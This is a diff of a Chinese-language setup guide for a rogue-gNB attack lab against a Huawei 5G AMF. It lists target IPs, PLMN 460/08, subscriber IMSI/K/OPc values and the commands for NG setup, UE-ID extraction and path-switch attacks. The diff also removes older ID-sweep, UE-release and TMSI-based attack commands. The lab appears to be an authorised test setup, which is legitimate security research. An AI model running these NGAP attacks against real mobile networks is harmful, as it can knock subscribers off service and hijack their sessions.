@@ -1,4 +1,7 @@
-# 对接华为 AMF（14.55.2.5）部署指南 —— 联网 / WSL 原生 / 最小集
+# 对接华为 AMF 部署指南（装环境）
+
+> **现场怎么打、随机 AU 怎么读、全部攻击命令：见 [`操作手册_华为AMF.md`](操作手册_华为AMF.md)。**
+> 当前现场：AMF `14.66.2.5`，绑定 `13.254.241.142`，PLMN `460/08`。
 
 面向对象：一台**能联网**的 Win11 测试主机（已装 WSL2），直连华为 AMF。目标是从 GitHub
 `git clone` 后，在 WSL 里**一键装好、直接跑**：
@@ -76,15 +79,16 @@ bootstrap 会：检查内核 SCTP → 装依赖(build 工具/libsctp/python venv
 
 | 项 | 值 | 说明 |
 |---|---|---|
-| IMSI/SUPI | `001010000000001` | 华为用真实 PLMN 时，前 5 位改成其 MCC+MNC |
-| K (Ki) | `8baf473f2f8fd09487cccbd7097c6862` | |
-| OPc（类型 OPc，非 OP） | `8e27b6af0e692e750f32667a3b14605d` | |
+| IMSI/SUPI | `460081111111113` | 已写入 `real-amf.env` |
+| K (Ki) | `1234567890abcde1234567890abcde12` | |
+| OPc（类型 OPc，非 OP） | `FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF` | |
 | AMF(鉴权域) | `8000` | |
-| SQN 初值 | `000000000000` | 首次失败会 re-sync，正常 |
-| PLMN(MCC/MNC) | `001` / `01` | 必须与华为一致 |
+| PLMN(MCC/MNC) | `460` / `08` | |
 | TAC | `1` | |
-| S-NSSAI(SST/SD) | `1` / `010203` | |
+| S-NSSAI(SST/SD) | `1` / `010101` | |
 | DNN | `internet` | |
+| AMF N2 | `14.66.2.5:38412` | |
+| 本机源 IP | `13.254.241.142` | |
 
 ## 6. 起合法 gNB + UE（造受害者）
 
@@ -99,28 +103,14 @@ ping -I uesimtun0 8.8.8.8                # 可选：验证数据面
 
 ## 7. 流氓 gNB（ngap_tester）攻击
 
+华为 AMF-UE-NGAP-ID **每次随机**，不要 sweep。读 ID 和全部攻击命令见
+[`操作手册_华为AMF.md`](操作手册_华为AMF.md)。
+
 ```bash
-./deploy/ngt.sh ng-setup                 # 流氓 gNB 被 AMF 接受
+./deploy/ngt.sh ng-setup
+sudo ./deploy/extract-ue-ids.sh 30
+./deploy/ngt.sh path-switch --source-amf-ue-id <本次AU>
 ```
-
-拿受害者标识的三种办法：
-
-- **A. 读自己 UE 的 5G-GUTI（推荐）**：`nr-ue` 日志里有分配的 5G-GUTI，取出 5G-TMSI /
-  AMF-Set-ID / AMF-Pointer 喂给基于 TMSI 的攻击：
-  ```bash
-  ./deploy/ngt.sh chain-initue-release --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex>
-  ```
-- **B. 暴力扫 AMF-UE-NGAP-ID**（keyed 在该 ID 的攻击）：
-  ```bash
-  ./deploy/ngt.sh sweep --attack ue-release --amf-range 1-2000
-  ```
-- **C. 直接读华为 AMF 日志**拿到 ID 后：
-  ```bash
-  ./deploy/ngt.sh path-switch --source-amf-ue-id <victim> --pdu-sessions 1
-  ./deploy/ngt.sh ue-release  --amf-ue-id <victim>
-  ```
-
-全部命令见 `python -m ngaptester.cli -h`（或 `./deploy/ngt.sh -h`）。
 
 ---
 
